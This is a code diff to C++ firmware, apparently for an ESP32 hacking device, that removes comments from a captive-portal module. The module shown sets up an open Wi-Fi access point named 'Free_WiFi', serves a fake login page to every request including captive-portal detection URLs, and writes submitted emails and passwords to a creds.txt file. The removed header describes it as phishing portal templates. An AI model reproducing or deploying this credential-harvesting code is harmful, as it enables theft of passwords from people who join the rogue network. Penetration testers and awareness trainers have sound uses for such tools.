@@ -1,10 +1,3 @@
-// ═══════════════════════════════════════════════════════════
-// Arsenal - Captive Portal Templates
-// Load custom phishing portal templates from SD card
-// Templates stored in /arsenal/portals/ as HTML files
-// Credentials logged to /arsenal/creds.txt
-// ═══════════════════════════════════════════════════════════
-
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -22,7 +15,7 @@ static const char *CREDS_FILE = "/arsenal/creds.txt";
 static int credsCapture = 0;
 static String activeTemplate = "";
 
-// Default portal HTML if no templates on SD
+
 static const char DEFAULT_PORTAL[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
@@ -65,7 +58,7 @@ h1{color:#00ff88}</style></head>
 static void logCredential(String email, String password) {
     if (!setupSdCard()) return;
 
-    // Create directory if needed
+
     if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
 
     File f = SD.open(CREDS_FILE, FILE_APPEND);
@@ -98,12 +91,12 @@ static void startPortalServer(String templateHTML) {
 
     portalServer = new AsyncWebServer(80);
 
-    // Serve the portal page
+
     portalServer->on("/", HTTP_GET, [templateHTML](AsyncWebServerRequest *request) {
         request->send(200, "text/html", templateHTML);
     });
 
-    // Also serve on any captive portal detection URLs
+
     portalServer->on("/generate_204", HTTP_GET, [templateHTML](AsyncWebServerRequest *request) {
         request->send(200, "text/html", templateHTML);
     });
@@ -114,7 +107,7 @@ static void startPortalServer(String templateHTML) {
         request->send(200, "text/html", templateHTML);
     });
 
-    // Credential capture endpoint
+
     portalServer->on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
         String email = request->hasArg("email") ? request->arg("email") : "N/A";
         String password = request->hasArg("password") ? request->arg("password") : "N/A";
@@ -122,7 +115,7 @@ static void startPortalServer(String templateHTML) {
         request->send(200, "text/html", SUCCESS_PAGE);
     });
 
-    // Catch-all redirect to portal
+
     portalServer->onNotFound([templateHTML](AsyncWebServerRequest *request) {
         request->send(200, "text/html", templateHTML);
     });
@@ -134,7 +127,7 @@ void arsenal_captive_portal_templates(void) {
     ARSENAL_SAFE_RUN([]() {
         credsCapture = 0;
 
-        // List available templates from SD
+
         options.clear();
         options.push_back({"Default (Generic Login)", []() {
             activeTemplate = "default";
@@ -160,7 +153,7 @@ void arsenal_captive_portal_templates(void) {
 
         if (activeTemplate.length() == 0) return;
 
-        // Load template
+
         String html;
         if (activeTemplate == "default") {
             html = String(DEFAULT_PORTAL);
@@ -168,15 +161,15 @@ void arsenal_captive_portal_templates(void) {
             html = loadTemplate(activeTemplate);
         }
 
-        // Start AP
+
         WiFi.mode(WIFI_AP);
         WiFi.softAP("Free_WiFi", "");
         delay(100);
 
-        // Start portal server
+
         startPortalServer(html);
 
-        // Show status screen
+
         while (true) {
             drawMainBorderWithTitle("Captive Portal");
             int y = 45;
@@ -221,7 +214,7 @@ void arsenal_captive_portal_templates(void) {
             delay(500);
         }
 
-        // Cleanup
+
         portalServer->end();
         delete portalServer;
         portalServer = nullptr;
